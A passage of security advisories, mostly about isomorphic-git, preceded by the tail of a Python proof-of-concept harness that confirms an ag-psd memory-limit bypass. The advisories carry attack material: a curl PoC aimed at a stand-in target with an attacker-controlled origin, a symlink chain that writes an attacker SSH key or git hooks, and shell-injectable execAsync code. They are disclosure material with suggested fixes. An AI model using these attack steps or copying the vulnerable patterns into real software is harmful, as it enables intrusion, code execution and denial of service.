    print(f"[*] Node.js runner written to {node_script_path}")

    # Run from /app where the ag-psd repo was built
    app_dir = os.environ.get("APP_DIR", "/app")
    print(f"[*] Running Node.js PoC from {app_dir} ...")

    try:
        proc = subprocess.run(
            ["node", node_script_path],
            capture_output=True,
            text=True,
            timeout=60,
            cwd=app_dir,
        )
    except subprocess.TimeoutExpired:
        print("[-] Node.js process timed out (possible OOM or hang)")
        sys.exit(1)

    stdout = proc.stdout.strip()
    stderr = proc.stderr.strip()

    print("\n--- Node.js stdout ---")
    print(stdout or "(empty)")
    if stderr:
        print("--- Node.js stderr ---")
        print(stderr)
    print("--- Exit code:", proc.returncode, "---\n")

    # Parse key-value output lines
    kv = {}
    for line in stdout.splitlines():
        if "=" in line:
            k, _, v = line.partition("=")
            kv[k.strip()] = v.strip()

    exploited = kv.get("VULN_001_EXPLOITED", "false").lower() == "true"
    layer_bytes = int(kv.get("LAYER_IMAGE_BYTES", "0"))
    psd_bytes_reported = int(kv.get("PSD_BYTES", "0"))
    memory_limit = int(kv.get("TOTAL_MEMORY_LIMIT_OPTION", "0"))
    delta = int(kv.get("ARRAYBUFFER_DELTA", "0"))

    print("=== VULNERABILITY ASSESSMENT ===")
    print(f"  PSD input size         : {psd_bytes_reported} bytes")
    print(f"  totalMemoryLimit option: {memory_limit} bytes (1 KB)")
    print(f"  Layer image buffer     : {layer_bytes:,} bytes ({layer_bytes // 1024 // 1024} MB)")
    print(f"  ArrayBuffer delta      : {delta:,} bytes")
    print(f"  Limit bypassed         : {'YES — VULNERABLE' if exploited else 'NO — limit was enforced'}")

    if not exploited:
        print("\n[FAIL] Exploitation did not succeed.")
        result = {
            "passed": False,
            "verdict": "FAIL",
            "reason": "PoC 실행에서 메모리 제한 우회가 관측되지 않음. totalMemoryLimit이 예상과 달리 적용된 것으로 보임.",
            "build_command": "docker build -t ag-psd-vuln-001 -f vuln-001/Dockerfile .",
            "run_command": "docker run --rm ag-psd-vuln-001",
            "poc_command": "python3 poc.py",
            "evidence": stdout + ("\n" + stderr if stderr else ""),
            "artifacts": ["Dockerfile", "poc.py"],
        }
    else:
        print("\n[PASS] VULN-001 confirmed: totalMemoryLimit=1024 was bypassed.")
        print(f"       Allocated {layer_bytes // 1_000_000} MB from a {psd_bytes_reported}-byte PSD.")
        result = {
            "passed": True,
            "verdict": "PASS",
            "reason": (
                f"totalMemoryLimit=1024(1KB) 옵션이 설정되었음에도 {layer_bytes:,}바이트({layer_bytes // 1_000_000}MB)의 레이어 이미지 버퍼가 할당됨. "
                f"decodeLayerImageData(layer, reader)에서 reader.totalMemoryLimit이 options.memoryLimit으로 전달되지 않아 "
                f"createImageDataBitDepth 내부의 사이즈 검사가 완전히 우회되는 것이 컨테이너 실행에서 관측적으로 확인됨."
            ),
            "build_command": "docker build -t ag-psd-vuln-001 -f vuln-001/Dockerfile .",
            "run_command": "docker run --rm ag-psd-vuln-001",
            "poc_command": "python3 poc.py",
            "evidence": stdout,
            "artifacts": ["Dockerfile", "poc.py"],
        }

    result_path = os.path.join(
        os.environ.get("RESULT_DIR", "/tmp"), "phase2_result.json"
    )
    with open(result_path, "w", encoding="utf-8") as f:

entry.title: [isomorphic-git] isomorphic-git: Path traversal via a ".." tree-entry name writes files outside the working directory on clone/checkout
entry.content:
Summary

isomorphic-git's tree parser (src/models/GitTree.js) validates each entry name only against the path separators / and \. It does not reject the standalone reserved name .., so a malicious repository can, on a single clone/checkout, write files outside the working directory (unbounded depth). Works on any host-backed fs provider.

Details

The guard is:

// src/models/GitTree.js
if (path.includes('\\') || path.includes('/')) {
  throw new UnsafeFilepathError(path)
}

The standalone string .. passes. isomorphic-git assembles the full path incrementally across tree levels, so nesting .. trees yields ../escaped.txt, ../../escaped.txt, … with unbounded depth (each level is a separate tree object that passes the per-entry guard). On checkout mkdir(workdir/..) hits EEXIST (ignored) and the file is written above the working directory. Depth is chosen to reach the home dir, /etc, /tmp, etc.; overwriting a shell rc / config / startup file can escalate to code execution.

Canonical git behavior (divergence)

git rejects this via verify_path(): git read-tree fails with error: invalid path '../escaped.txt' and git fsck flags warning … hasDotdot: contains '..'. (git's verify_path also rejects . and .git, the latter flagged by fsck as hasDotgit — see the fix note below.) GitHub runs fsck on push, so such a tree can't be hosted there; reach is limited to a self-hosted/Smart-HTTP remote or a MitM.

PoC

https://github.com/spiceoverflow/av2-dotdot-traversal — open in a Codespace; a single git.clone() from the bundled server writes escaped.txt one directory above the clone target (DEPTH=N escapes N levels):

[AV-2] *** PATH TRAVERSAL CONFIRMED ***
[AV-2] File written outside workdir: …/escaped.txt

Impact

A path-traversal arbitrary file write outside the working directory (CWE-22), triggered by a single clone/checkout; it can escalate to code execution by overwriting shell rc, config, or startup files.

Any application or user that clones/checks out an untrusted (or compromised / MitM'd) repository with isomorphic-git on a host-backed filesystem (Linux, macOS, or Windows — no symlink or privilege required). Requires a non-GitHub remote (self-hosted / Smart-HTTP) or a MitM, since GitHub's fsck rejects trees containing ...

Suggested fix

In the tree parser, reject any entry name equal to . or ... For full verify_path parity it should also reject .git (case-insensitively, trailing dots/spaces stripped) and the NTFS 8.3 / HFS variants git blocks. Note: a literal .git entry is not independently exploitable via clone/checkout in current isomorphic-git — the checkout walk skips a .git tree entry (a sibling file is written but the .git entry is not), so rejecting .git is defense-in-depth / git parity rather than a separately demonstrated bug. Additionally, normalize and bounds-check the assembled full path against the working-tree root before any filesystem write.

References

  • https://github.com/isomorphic-git/isomorphic-git/security/advisories/GHSA-cw2g-2vwq-88w6
  • https://nvd.nist.gov/vuln/detail/CVE-2026-63478
  • https://github.com/isomorphic-git/isomorphic-git/pull/2370
  • https://github.com/isomorphic-git/isomorphic-git/commit/823843d1cd19182df79bc907c767f5bcecb39a0b
  • https://github.com/isomorphic-git/isomorphic-git/releases/tag/v1.38.6
  • https://github.com/advisories/GHSA-cw2g-2vwq-88w6

entry.title: [isomorphic-git] isomorphic-git: Circular symbolic references cause non-terminating resolution (DoS)
entry.content:
Summary

A malicious server can advertise circular symref= capabilities (e.g. a → b and b → a). isomorphic-git writes them to disk as loose symrefs, and GitRefManager.resolve() follows them with no depth limit and no cycle detection, so any later operation that resolves one of them (log, status, checkout, branch, …) loops forever — a persistent denial of service from a single clone.

Details

src/managers/GitRefManager.js — resolve() only enforces a depth limit when a depth argument is passed (depth = undefined by default), and has no visited-set:

static async resolve({ fs, gitdir, ref, depth = undefined }) {
  if (depth !== undefined) { depth--; if (depth === -1) return ref }
  …
}

updateRemoteRefs persists all server-supplied symrefs unconditionally. After clone the client has refs/remotes/origin/a → ref: refs/remotes/origin/b and b → a on disk; resolving either never terminates. Because the bad refs live on disk, the repo is effectively bricked for the application.

Canonical git behavior (divergence)

git caps symref resolution at SYMREF_MAXDEPTH = 5 (refs.c): git rev-parse a returns immediately with warning: ignoring dangling symref — no recursion, no hang.

PoC

https://github.com/spiceoverflow/av5-circular-symref — open in a Codespace; clone writes the circular symrefs, then git.log on one never returns (the runner stops it after a 20s hang):

[AV-5] refs/remotes/origin/a contains: ref: refs/remotes/origin/b
[AV-5] refs/remotes/origin/b contains: ref: refs/remotes/origin/a
[run] *** DoS CONFIRMED: resolving a circular symref never terminates ***

Impact

A persistent denial of service via non-terminating symbolic-ref resolution (CWE-674 / CWE-835). After a single clone from a malicious (or MitM'd) server the circular refs are written to disk, so every later operation that resolves them (log, status, checkout, branch, …) hangs forever — the repository becomes effectively unusable for the application.

Impacted: any application that clones from untrusted/compromised remotes with isomorphic-git.

Suggested fix

Add visited-set cycle detection (and/or a default maximum depth, as git does) in GitRefManager.resolve(); optionally validate server-supplied symref targets before persisting.

References

  • https://github.com/isomorphic-git/isomorphic-git/security/advisories/GHSA-96wc-2m84-2cj7
  • https://nvd.nist.gov/vuln/detail/CVE-2026-63475
  • https://github.com/isomorphic-git/isomorphic-git/pull/2370
  • https://github.com/isomorphic-git/isomorphic-git/commit/823843d1cd19182df79bc907c767f5bcecb39a0b

entry.title: [isomorphic-git] isomorphic-git: Arbitrary file write outside of working tree via directory symlink during checkout (potential RCE)
entry.content:
Summary

git.checkout writes working-tree files through a directory symlink without checking the leading path, so a malicious repository can write outside the intended working directory. The defect is in isomorphic-git's checkout logic itself and is therefore independent of the fs provider. The impact depends on the configured filesystem; worst case is arbitrary file write on the host, e.g. injecting an attacker key into ~/.ssh/authorized_keys → remote login / code execution.

Details

A single git tree can't hold a name as both a symlink and a directory, so the attack uses two states:

Commit N:    config            (mode 120000, symlink → ../.ssh)
Commit N+1:  config/           (mode 040000, tree)
               authorized_keys (mode 100644, attacker public key)

Checking out commit N writes config as a directory symlink. Checking out commit N+1 sees config/authorized_keys as a new path: isomorphic-git mkdirs the parent (config, already a symlink → EEXIST, ignored) then writeFiles the file, which the OS resolves through the symlink to outside the working directory. A file-level symlink swap is caught (the 120000→100644 mode change triggers an rm), but the directory-level variant is not — the payload is always a new child path, a plain create, so the parent symlink is never removed.

The symlink target is attacker-chosen. Besides ~/.ssh, pointing it at the repo's own control directory — hooks → .git/hooks then hooks/pre-commit, or x → .git then overwriting .git/config (core.hooksPath / alias / core.fsmonitor) — yields RCE on the next native git command without depending on ~/.ssh existing, since .git/ is always present in a fresh clone.

Canonical git behavior (divergence)

git refuses to do this: has_symlink_leading_path() (symlinks.c) checks each leading path component during checkout and will not follow a symlink — the hardening behind CVE-2021-21300 and CVE-2024-32002. isomorphic-git has no equivalent check.

PoC

https://github.com/spiceoverflow/av1-symlink-hook-rce — open in a Codespace; it builds the malicious repo, serves it locally, and runs a victim. Output on Linux:

[AV-1] Directory symlink on disk: …/config → ../.ssh  (→ /home/node/.ssh)
[AV-1] *** SSH KEY INJECTION CONFIRMED ***

Trigger: minimal realistic path is clone (commit N) + a later pull (commit N+1) — ordinary sync of an already-trusted repo. It also collapses to a single clone when the consuming app reads or writes into the cloned tree, or when a symlink already exists on disk.

Impact

isomorphic-git is filesystem-agnostic, so exploitability and blast radius depend on the active fs provider — specifically whether it creates a symlink and follows it on a later write:

  • Node fs on Linux/macOS (servers, CI, CLIs, Electron/desktop tooling — the common server-side use): real OS symlinks → the write lands anywhere the process can reach → arbitrary file write on the host → RCE (the PoC above). Highest impact.
  • Node fs on Windows: fs.symlink typically requires privilege and throws EPERM, so the symlink-plant step usually fails — not exploitable by default. (A property of the OS/provider, not of isomorphic-git.)
  • In-memory / browser providers (memfs, ZenFS, lightning-fs, custom fs): there is no host filesystem to escape to, so the worst case is writing outside the intended clone directory but within that virtual filesystem — i.e. corrupting other repos/app data the same provider holds. Bounded by the sandbox, and only if the provider implements symlink creation + following.

The CVSS above reflects the worst-case (Node fs on a POSIX host). Browser/in-memory-only deployments are lower severity (sandboxed integrity impact).

Suggested fix

Before each working-tree write, lstat every leading path component and refuse to traverse a symlink (mirrors git's has_symlink_leading_path()); optionally honor core.symlinks=false.

entry.title: [filecoin-pin] filecoin-pin: Unbounded DAG pinning can exhaust server resources
entry.content:
Summary

The IPFS Pinning Service API implementation accepts a caller-controlled CID through POST /pins, queues background processing, and then recursively fetches the full DAG with helia.pins.add(cid). The route and background pinning path do not enforce a request rate limit, per-user quota, maximum DAG byte count, maximum block count, traversal timeout, or concurrent pinning limit.

An authenticated caller, or an unauthenticated caller when the server is started with ALLOW_NO_AUTH=true, can submit one or more pins whose CIDs resolve to very large DAGs. The server writes fetched blocks to CAR files under carStoragePath and can consume disk, network, CPU, and libp2p resources until the process or host becomes unavailable.

Details

POST /pins validates only that the request body contains a syntactically valid CID string, then forwards it to the pin store:

  • src/filecoin-pinning-server.ts:304-342 accepts the request, parses cid with CID.parse, and calls pinStore.pin(request.user, cidObject, parsed.options).
  • src/filecoin-pin-store.ts:153-188 stores the pin as queued and schedules _processPinInBackground with setTimeout. There is no queue, semaphore, or global cap around this scheduling.
  • src/filecoin-pin-store.ts:211-217 creates a per-pin Helia node and forwards caller-supplied origins.
  • src/filecoin-pin-store.ts:260-274 walks the full DAG with for await (const pinnedCid of helia.pins.add(cid)).
  • src/create-pinning-helia.ts:47-80 creates a libp2p/Helia node with the Bitswap block broker and no application-level resource limits.
  • src/core/car/car-blockstore-base.ts:65-107 writes every fetched block and updates stats.totalSize only after writing.
  • src/core/car/car-file-backend.ts:84-93 streams blocks to the CAR writer on disk.

The Helia node created for each pin has no bootstrap or mDNS configuration (src/create-pinning-helia.ts:57). A public CID alone may therefore not be fetchable unless the node can reach a content source. In practice, the API also accepts origins, so an attacker can supply a reachable attacker-controlled libp2p origin that serves a large DAG and cause the server to retrieve it.

Impact

Successful exploitation affects availability:

  • Disk exhaustion from unbounded CAR files in carStoragePath.
  • Network exhaustion from recursive Bitswap retrieval.
  • CPU and memory pressure from concurrent libp2p/Helia pin operations.
  • Service degradation or process failure for other users of the daemon.
  • Operational cost and manual recovery burden from large partial CAR files.

The default daemon configuration reduces exposure because the server binds to localhost and refuses to start without an access token unless ALLOW_NO_AUTH=true. The finding is most significant when the daemon is exposed beyond localhost, when the token is shared across untrusted users, or when the no-auth mode is enabled.

PoC

curl -X POST "https://target.example/pins" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "cid": "CID_OF_LARGE_DAG",
    "origins": ["/ip4/203.0.113.10/tcp/4001/p2p/ATTACKER_PEER_ID"],
    "meta": { "purpose": "resource-exhaustion-validation" }
  }'

Submitting many such requests concurrently accelerates resource pressure because each request schedules independent background processing.

entry.title: [@siteboon/claude-code-ui] @siteboon/claude-code-ui is Vulnerable to Command Injection via Multiple Parameters
entry.content:
Summary

Multiple Git-related API endpoints use execAsync() with string interpolation of user-controlled parameters (file, branch, message, commit), allowing authenticated attackers to execute arbitrary OS commands.

Details

The claudecodeui application provides Git integration through various API endpoints. These endpoints accept user-controlled parameters such as file paths, branch names, commit messages, and commit hashes, which are directly interpolated into shell command strings passed to execAsync().

The application attempts to escape double quotes in some parameters, but this protection is trivially bypassable using other shell metacharacters such as:

Command substitution: $(command) or `command` Command chaining: ;, &&, || Newlines and other control characters

Affected Endpoints

GET /api/git/diff - file parameter GET /api/git/status - file parameter POST /api/git/commit - files array and message parameter POST /api/git/checkout - branch parameter POST /api/git/create-branch - branch parameter GET /api/git/commits - commit hash parameter GET /api/git/commit-diff - commit parameter

Vulnerable Code

File: server/routes/git.js

// Line 205 - git status with file parameter
const { stdout: statusOutput } = await execAsync(
  `git status --porcelain "${file}"`,  // INJECTION via file
  { cwd: projectPath }
);

// Lines 375-379 - git commit with files array and message
for (const file of files) {
  await execAsync(`git add "${file}"`, { cwd: projectPath });  // INJECTION via files[]
}
const { stdout } = await execAsync(
  `git commit -m "${message.replace(/"/g, '\\"')}"`,  // INJECTION via message (bypass with $())
  { cwd: projectPath }
);

// Lines 541-543 - git show with commit parameter (no quotes!)
const { stdout } = await execAsync(
  `git show ${commit}`,  // INJECTION via commit
  { cwd: projectPath }
);

Impact

  • Remote Code Execution as the Node.js process user
  • Full server compromise
  • Data exfiltration
  • Supply chain attacks - modify committed code to inject malware

Fix

Commit: siteboon/claudecodeui@55567f4

Root cause remediation

All vulnerable execAsync() calls have been replaced with the existing spawnAsync() helper (which uses child_process.spawn with shell: false). Arguments are passed as an array directly to the OS — shell metacharacters in user input are inert.

Endpoints patched in server/routes/git.js:

  • GET /api/git/diff — file (4 calls)
  • GET /api/git/file-with-diff — file (3 calls)
  • POST /api/git/commit — files[], message
  • POST /api/git/checkout — branch
  • POST /api/git/create-branch — branch
  • GET /api/git/commits — commit.hash
  • GET /api/git/commit-diff — commit
  • POST /api/git/generate-commit-message — file
  • POST /api/git/discard — file (3 calls)
  • POST /api/git/delete-untracked — file
  • POST /api/git/publish — branch

A strict allowlist regex (/^[0-9a-f]{4,64}$/i) was also added to validate the commit parameter in /api/git/commit-diff before it reaches the git process.

Before / After

// BEFORE — shell interprets the string, injection possible
const { stdout } = await execAsync(`git show ${commit}`, { cwd: projectPath });

// AFTER — no shell, args passed directly to the process
const { stdout } = await spawnAsync('git', ['show', commit], { cwd: projectPath });

  • https://github.com/siteboon/claudecodeui/releases/tag/v1.24.0
  • https://nvd.nist.gov/vuln/detail/CVE-2026-31862
  • https://github.com/advisories/GHSA-f2fc-vc88-6w7q

entry.title: [flowise] Duplicate Advisory: INVITED users auto-promoted via SSO email match (invite-token bypass)
entry.content:
Duplicate Advisory

This advisory has been withdrawn because it is a duplicate of GHSA-vf3j-89vf-r697. This link is maintained to preserve external references.

Original Description

Flowise through 3.1.4 (Enterprise/platform mode with SSO enabled) contains an authentication bypass in the SSO login path. When an SSO callback arrives with an email matching a user whose status is INVITED, verifyAndLogin (SSOBase.ts:80-94) copies the user record from the database — including the server-stored single-use invitation tempToken — into the data passed to AccountService.register(). The register handler's token lookup, email match, and expiry checks therefore pass trivially against the server's own token instead of a caller-supplied one, and the account and its organization membership are flipped to ACTIVE. As a result, anyone able to authenticate at any configured SSO provider using a pending invitee's email address as the email claim can take over that invitation and obtain the invited user's access to the organization without ever possessing the emailed invitation token, for as long as the invitation is valid (24 hours by default). At the time of the advisory no patched version was available.

entry.title: [protobufjs] protobufjs has an arbitrary code execution issue
entry.content:
Summary

protobufjs could execute generated JavaScript code derived from protobuf schema metadata. When loading a crafted JSON descriptor, schema-controlled type names and type references could reach runtime code generation without sufficient validation.

Impact

An attacker who can provide a malicious protobuf definition or JSON descriptor to an application may be able to execute arbitrary JavaScript in the context of the process using protobufjs.

This requires control over the protobuf schema or descriptor being loaded. Applications that only decode messages using trusted, application-defined schemas are not directly affected by this issue.

Preconditions

  • The application must allow an attacker to control or influence a protobuf definition or JSON descriptor.
  • The application must load that definition through protobufjs reflection APIs such as descriptor loading.
  • The affected generated-code path must be reached, for example by performing an operation on the loaded type.

Workarounds

Do not load protobuf definitions or JSON descriptors from untrusted sources with affected versions. If untrusted schemas must be accepted, validate or restrict them before loading and run schema processing in an isolated environment.

entry.title: [minimatch] minimatch has potential denial of service via globparts amplification
entry.content:
minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel >= 2.

researcher: Reid Downing (b1nv0id) files:

  • src/index.ts: 690-770
  • src/index.ts: 780-796

issue: input-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.

the **/../ transformation clones a globparts entry and appends the clone to the same globparts array:

parts.splice(gs, 1)
const other = parts.slice(0)
other[gs] = '**'
globParts.push(other)

this occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.

the expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:

for (let i = 0; i < globParts.length - 1; i++) {
  for (let j = i + 1; j < globParts.length; j++) {
    this.partsMatch(...)
  }
}

an attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.
